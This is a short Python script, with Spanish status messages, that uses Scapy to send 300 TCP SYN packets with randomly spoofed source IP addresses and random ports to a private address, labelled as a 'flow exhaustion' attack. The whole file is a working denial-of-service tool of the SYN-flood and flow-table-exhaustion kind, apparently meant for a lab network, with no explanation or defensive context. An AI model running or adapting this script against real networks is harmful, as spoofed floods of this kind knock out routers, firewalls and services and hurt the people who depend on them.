#!/usr/bin/env python3
from scapy.all import *
import random
iface = "ens4"
target = "10.100.0.1"
print(f"[*] Flow Exhaustion: IPs y puertos aleatorios -> {target}")
pkts = []
for _ in range(300):
    src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    pkts.append(
        Ether()/IP(src=src, dst=target)/TCP(sport=RandShort(), dport=RandShort(), flags="S")
    )
sendp(pkts, iface=iface, verbose=False, inter=0.005)
print(f"[+] Enviados {len(pkts)} paquetes con IPs aleatorias")